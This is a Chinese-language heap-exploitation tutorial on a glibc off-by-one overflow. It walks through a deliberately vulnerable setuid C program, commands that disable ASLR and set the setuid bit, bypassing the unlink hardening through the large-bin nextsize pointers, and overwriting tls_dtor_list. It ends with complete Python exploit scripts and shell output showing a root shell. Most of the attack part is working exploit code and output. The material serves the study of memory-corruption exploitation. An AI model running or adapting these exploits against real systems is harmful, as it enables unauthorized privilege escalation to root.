## Heap based Off-By-One 

​		当源字符串长度等于目标缓冲区长度时，将在目标缓冲区上方复制一个 NULL 字节。由于目标缓冲区位于堆中，单个 NULL 字节可能会覆盖下一个块的块头，这可能导致任意代码执行。

<u>存在漏洞的代码：</u>

```c
//consolidate_forward.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define SIZE 16

int main(int argc, char* argv[])
{

 int fd = open("./inp_file", O_RDONLY); /* [1] */
 if(fd == -1) {
 printf("File open error\n");
 fflush(stdout);
 exit(-1);
 }

 if(strlen(argv[1])>1020) { /* [2] */
 printf("Buffer Overflow Attempt. Exiting...\n");
 exit(-2);
 }

 char* tmp = malloc(20-4); /* [3] */
 char* p = malloc(1024-4); /* [4] */
 char* p2 = malloc(1024-4); /* [5] */
 char* p3 = malloc(1024-4); /* [6] */

 read(fd,tmp,SIZE); /* [7] */
 strcpy(p2,argv[1]); /* [8] */

 free(p); /* [9] */
}
```

<u>编译命令：</u>

```shell
#echo 0 > /proc/sys/kernel/randomize_va_space 		//ALSR close
$gcc -o consolidate_forward consolidate_forward.c 
$sudo chown root consolidate_forward 
$sudo chgrp root consolidate_forward 
$sudo chmod +s consolidate_forward
```

​		上述存在漏洞的代码第[2]行和第[8]行是可能发生基于堆的 off-by-one 溢出的位置。当单个NULL字节覆盖下一个块 p3 的块头时，可以实现任意代码执行。当一个大小为 1020 字节 (p2) 的块出现单个字节溢出时，下一个块 (p3) 标头的size字段的最低有效字节将被 NULL 字节覆盖，而不是 prev_size 的最低有效字节。

​		glibc 中的`checked_request2size`函数将用户请求的大小转换为可用大小（内部表示大小），因为存储 malloc_chunk 和对齐需要一些额外空间。转换以这样一种方式进行，即永远不会设置可用大小的最后 3 位，因为它用于存储标志信息 P、M 和 N。

​		因此，当 malloc(1020) 在我们的易受攻击的代码中执行时，1020 字节的用户请求大小将转换为 `((1020 + 4 + 7) & ~7) 1024 字节（内部表示大小）`。分配的 1020 字节块的额外开销只有 4 字节。但是对于分配的块，需要大小为 8 字节的块头，以便存储 prev_size 和 size 字段。1024 字节块的前 8 个字节将用于块头， 1016字节用于用户数据。如果分配了前一个块p2，则块p3的 prev_size 字段包含用户数据。所以位于这个分配的 1024 字节块p2旁边的块p3的 prev_size 包含剩余的 4 个字节的用户数据。

```c
#define request2size(req)                                         \
  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)  ?             \
   MINSIZE :                                                      \
   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)
```

​		在 off-by-one 漏洞下，单个NULL字节会覆盖下一个块的 LSB。即下一个块p3的标志位P被清除，表示溢出的块p2空闲。这种情况导致glibc代码在释放前一个块p时，取消链接(unlink)已处于分配状态的块p2。

​		取消链接(unlink)已经处于分配状态的块可能会导致任意代码执行，因为任何四字节内存区域都可以写入攻击者的数据。但因为 unlink 技术已经过时了，特别是由于`corrupted double linked list`的条件，原先的任意代码执行方法不可行。

​		但在 2014 年底，安全人员找到了一种新方法，通过取消链接一个大块成功绕过`corrupted double linked list`条件.

```c
#define unlink(P, BK, FD) { 
  FD = P->fd; 
  BK = P->bk;
  // Primary circular double linked list hardening - Run time check
  if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) /* [1] */
   malloc_printerr (check_action, "corrupted double-linked list", P); 
  else { 
   // If we have bypassed primary circular double linked list hardening, below two lines helps us to overwrite any 4 byte memory region with arbitrary data!!
   FD->bk = BK; /* [2] */
   BK->fd = FD; /* [3] */
   if (!in_smallbin_range (P->size) 
   && __builtin_expect (P->fd_nextsize != NULL, 0)) { 
    // Secondary circular double linked list hardening - Debug assert
    assert (P->fd_nextsize->bk_nextsize == P);  /* [4] */
        assert (P->bk_nextsize->fd_nextsize == P); /* [5] */
    if (FD->fd_nextsize == NULL) { 
     if (P->fd_nextsize == P) 
      FD->fd_nextsize = FD->bk_nextsize = FD; 
     else { 
      FD->fd_nextsize = P->fd_nextsize; 
      FD->bk_nextsize = P->bk_nextsize; 
      P->fd_nextsize->bk_nextsize = FD; 
      P->bk_nextsize->fd_nextsize = FD; 
     } 
    } else { 
     // If we have bypassed secondary circular double linked list hardening, below two lines helps us to overwrite any 4 byte memory region with arbitrary data!!
     P->fd_nextsize->bk_nextsize = P->bk_nextsize; /* [6] */
     P->bk_nextsize->fd_nextsize = P->fd_nextsize; /* [7] */
    } 
   } 
  } 
}
```

​		在 glibc malloc 中，主循环双链表由 malloc_chunk 的 fd 和 bk 字段维护，而二级循环双链表由 malloc_chunk 的 fd_nextsize 和 bk_nextsize 字段维护。看起来`corrupted double linked list`加固适用于主（第 [1] 行）和辅助（第 [4] 和 [5] 行）双链表，但辅助循环双链表的加固只是一个调试断言语句（而不是像主循环双链表强化这样的运行时检查，它不会编译到生产版本中，至少在Fedora 20 (x86) 操作系统中）。因此二级循环双链表强化（第 [4] 和 [5] 行）没有意义，它允许我们将任意数据写入任何 4 字节内存区域（第 [6] 和 [7] 行）。

​		由于攻击者可以控制要释放的块，因此他会覆盖 malloc_chunk 如下元素：

```
* fd应该指向释放的块地址, 以绕过主循环双链表加固。
* bk应该指向释放的块地址，以绕过主循环双链表加固。
* fd_nextsize应该指向free_got_addr – 0x14
* bk_nextsize应该指向系统地址
```

​		第 [6] 和 [7] 行希望 fd_nextsize 和 bk_nextsize 都是可写的。fd_nextsize 是可写的（它指向 free_got_addr – 0x14），但 bk_nextsize 是不可写的，因为它指向属于 libc.so 的文本段的 system_addr。这个问题通过**overwirte tls_dtor_list** 来解决。

<u>Overwriting tls_dtor_list:</u>

​		`tls_dtor_list`是一个线程局部变量，其中包含要在 `exit() `期间调用的函数指针列表。 `__call_tls_dtors`遍历 `tls_dtor_list `并一一调用函数！！因此，如果我们可以使用包含 `system` 和 `system_arg`的堆地址覆盖`tls_dtor_list` 来代替`dtor_list`的 `func`和`obj `，那么可以调用 `system()`。

​		反汇编 __call_tls_dtors()，如下图所示：

```shell
(gdb) disassemble __call_tls_dtors
Dump of assembler code for function __call_tls_dtors:
   0x417a8660 <+0>:	push   %ebp
   0x417a8661 <+1>:	push   %edi
   0x417a8662 <+2>:	push   %esi
   0x417a8663 <+3>:	push   %ebx
   0x417a8664 <+4>:	call   0x418acd75 <__x86.get_pc_thunk.bx>
   0x417a8669 <+9>:	add    $0x187997,%ebx
   0x417a866f <+15>:	lea    0x20,%edi
   0x417a8675 <+21>:	sub    $0x1c,%esp
   0x417a8678 <+24>:	lea    -0x168(%ebx),%eax
   0x417a867e <+30>:	call   0x4178d3a0 <free@plt+32>
   0x417a8683 <+35>:	mov    -0x12c(%ebx),%esi
   0x417a8689 <+41>:	mov    (%edi,%eax,1),%ebp
   0x417a868c <+44>:	mov    %eax,0xc(%esp)
   0x417a8690 <+48>:	test   %ebp,%ebp
   0x417a8692 <+50>:	jne    0x417a86ba <__call_tls_dtors+90>
   0x417a8694 <+52>:	jmp    0x417a8710 <__call_tls_dtors+176>
...
(gdb) b * 0x417a8689
Breakpoint 2 at 0x417a8689
(gdb) c
Continuing.
Breakpoint 2, 0x417a8689 in __call_tls_dtors () from /lib/libc.so.6
(gdb) i r
eax            0xb7fe96b4	-1208052044
ecx            0xb7fe96b4	-1208052044
edx            0xb7fe9bc8	-1208050744
ebx            0x41930000	1100152832
esp            0xbffff1d0	0xbffff1d0
ebp            0x0	0x0
esi            0x4176e000	1098309632
edi            0x20	32
...
```

​		因此，fd_nextsize 可写的问题得到解决，因为 tls_dtor_list 属于 libc.so 的可写段，指令`0x417a8689 <+41>:	mov    (%edi,%eax,1),%ebp ` 是将`tls_dtor_list`地址复制到`ebp`中，因此`tls_dtor_list address = edi + eax*1 = 0x20 + 0xb7fe96b4 * 1 = 0xb7fe96d4`；bk_next 大小可写的问题得到解决，因为它指向堆地址。

<u>漏洞利用代码：</u>

```python
#exp.py
#!/usr/bin/env python
import struct
from subprocess import call

fd = 0x0804b418
bk = 0x0804b418
fd_nextsize = 0xb7fe96c0 # tls_dtor_list address - 0x14
bk_nextsize = 0x804b430 
system = 0x417b4970    # readelf -s /usr/lib/libc-2.18.so | grep system
sh = 0x80482ce

#endianess convertion
def conv(num):
 return struct.pack("<I",num)

buf = conv(fd)
buf += conv(bk)
buf += conv(fd_nextsize)
buf += conv(bk_nextsize)
buf += conv(system)
buf += conv(sh)
buf += "A" * 996

print "Calling vulnerable program"
call(["./vuln", buf])

```

​		执行上述利用代码，并没有得到root shell，而是一个以自身特权级别运行的bash shell：

```
[user@localhost project]$ python exp.py 
Calling vulnerable program
sh-4.2$ id
uid=1000(user) gid=1000(user) groups=1000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
sh-4.2$ exit
exit
[user@localhost project]$ 
```

​		当 `uid != euid` 时 /bin/bash 放弃特权。二进制文件`consolidate_forward`的真实`uid=1000`和他的有效`uid = 0`。因此，当 system() 被调用时，bash 会放弃特权。为了解决这个问题，我们需要在 system() 之前调用 setuid(0)，并且由于 _call_tls_dtors() 会遍历 tls_dtor_list，因此我们需要链接 setuid() 和 system() 以获得 root shell。

<u>完整的漏洞利用代码：</u>

```python
#gen_file.py
#!/usr/bin/env python
import struct

#dtor_list
setuid = 0x41830060
setuid_arg = 0x0
mp = 0x804b020
nxt = 0x804b430

#endianess convertion
def conv(num):
 return struct.pack("<I",num)

tst = conv(setuid)
tst += conv(setuid_arg)
tst += conv(mp)
tst += conv(nxt)

print tst
-----------------------------------------------------------------------------------------------------
#exp.py
#!/usr/bin/env python
import struct
from subprocess import call

fd = 0x0804b418
bk = 0x0804b418
fd_nextsize = 0xb7fe96c0 # tls_dtor_list address - 0x14
bk_nextsize = 0x804b430 
system = 0x417b4970    # readelf -s /usr/lib/libc-2.18.so | grep system
sh = 0x80482ce

#endianess convertion
def conv(num):
 return struct.pack("<I",num)

buf = conv(fd)
buf += conv(bk)
buf += conv(fd_nextsize)
buf += conv(bk_nextsize)
buf += conv(system)
buf += conv(sh)
buf += "A" * 996

print "Calling vulnerable program"
call(["./vuln", buf])
```

​		执行上述漏洞利用代码，得到root shell:

```shell
[user@localhost project]$ python gen_file.py > inp_file 
[user@localhost project]$ python exp.py
Calling vulnerable program
sh-4.2# whoami
root
```

​		
